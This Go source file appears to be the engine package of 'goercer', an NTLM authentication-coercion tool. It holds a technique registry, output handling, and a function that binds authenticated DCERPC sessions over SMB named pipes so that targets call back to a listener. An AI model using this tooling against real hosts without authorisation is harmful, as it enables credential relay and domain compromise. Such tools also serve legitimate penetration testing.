package coercer

import (
	"encoding/json"
	"fmt"
	"io"
	"sync"

	"goercer/internal/callback"
	"goercer/internal/config"
	"goercer/internal/ntlm"
	"goercer/internal/smbxport"
)

// Result summarises a single coercion run across all fired opnums.
type Result struct {
	Target          string   `json:"target"`
	Listener        string   `json:"listener"`
	Method          string   `json:"method"`
	Pipe            string   `json:"pipe"`
	Mode            string   `json:"mode"`
	Successful      bool     `json:"successful"`
	SuccessfulOp    int      `json:"successful_opnum,omitempty"`
	AttemptedOpnums []uint16 `json:"attempted_opnums"`
	LastErr         string   `json:"last_error,omitempty"`
}

// Out routes human-readable and machine-readable output to the configured
// sinks. It isolates all formatting so individual coercers stay free of
// printing concerns. Safe for concurrent use.
type Out struct {
	mu      sync.Mutex
	w       io.Writer
	verbose bool
	json    bool
}

// NewOut returns an Out bound to w.
func NewOut(w io.Writer, verbose, jsonOut bool) *Out {
	return &Out{w: w, verbose: verbose, json: jsonOut}
}

// Info always prints an informational line.
func (o *Out) Info(format string, args ...any) {
	o.mu.Lock()
	defer o.mu.Unlock()
	fmt.Fprintf(o.w, format+"\n", args...)
}

// Debug prints only in verbose mode.
func (o *Out) Debug(format string, args ...any) {
	if !o.verbose {
		return
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	fmt.Fprintf(o.w, "[DEBUG] "+format+"\n", args...)
}

// ResultJSON marshals the result to JSON on stdout when enabled.
func (o *Out) ResultJSON(r *Result) {
	if !o.json {
		return
	}
	o.mu.Lock()
	defer o.mu.Unlock()
	b, _ := json.MarshalIndent(r, "", "  ")
	fmt.Fprintln(o.w, string(b))
}

// Coercer is the pluggable unit of a coercion technique. Implementations own
// their complete pipeline: open the correct named pipe, bind, optionally
// perform a setup call, and fire each opnum.
type Coercer interface {
	// Name returns the canonical method identifier used on the CLI.
	Name() string
	// Description is a short human summary.
	Description() string
	// Execute runs the full technique against the session.
	Execute(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error)
}

// registry maps method names to their constructor.
var registry = map[string]func() Coercer{}

// Register is called from each method package's init() to make a technique
// available. Adding a new technique is one registration away.
func Register(name string, f func() Coercer) {
	registry[name] = f
}

// Lookup returns the Coercer for name, or nil if unregistered.
func Lookup(name string) Coercer {
	if f, ok := registry[name]; ok {
		return f()
	}
	return nil
}

// Names lists all registered method names.
func Names() []string {
	out := make([]string, 0, len(registry))
	for n := range registry {
		out = append(out, n)
	}
	return out
}

// Run executes the named coercion method against a live session and emits the
// human/JSON result. It is the engine entrypoint used by main.
func Run(sess *smbxport.Session, cfg *config.Config, out *Out) (*Result, error) {
	c := Lookup(cfg.Method)
	if c == nil {
		return nil, fmt.Errorf("unknown method %q (registered: %v)", cfg.Method, Names())
	}
	out.Info("[*] Using %s technique", c.Description())
	res, err := c.Execute(sess, cfg, out)
	if res != nil {
		out.ResultJSON(res)
	}
	return res, err
}

// Paths returns the callback service for the mode in the config.
func Paths(cfg *config.Config) *callback.PathService {
	mode := callback.UNC
	if cfg.Mode == config.ModeHTTP {
		mode = callback.HTTP
	}
	return callback.New(cfg.Listener, mode)
}

// NewAuth builds the NTLM auth state for a fresh bound pipe, sharing the
// caller's credential material.
func NewAuth(cfg *config.Config) *ntlm.AUTH {
	return ntlm.New(cfg.User, cfg.Password, cfg.Domain, cfg.HashBytes)
}

// Bind opens the named pipe and performs the 3-way DCERPC PKT_PRIVACY bind,
// returning a BoundPipe ready for authenticated requests. Methods call this
// through their own pipe metadata so the open/bind logic lives in one place.
func Bind(sess *smbxport.Session, cfg *config.Config, out *Out, pipeName, uuid string, major, minor uint16) (*BoundPipe, error) {
	out.Info("[-] Opening pipe \\pipe\\%s", pipeName)
	p, err := sess.OpenNamedPipe(pipeName)
	if err != nil {
		return nil, err
	}

	auth := NewAuth(cfg)
	bound := &BoundPipe{Pipe: p, Auth: auth}
	if err := bindDCERPC(bound, uuid, major, minor, out); err != nil {
		p.CloseFile()
		return nil, err
	}
	out.Info("[+] DCERPC authentication complete")
	return bound, nil
}

// BoundPipe couples an opened SMB named pipe with the NTLM auth state derived
// for it during the DCERPC bind.
type BoundPipe struct {
	Pipe *smbxport.Pipe
	Auth *ntlm.AUTH
}

// Close releases the underlying named pipe.
func (b *BoundPipe) Close() { b.Pipe.CloseFile() }
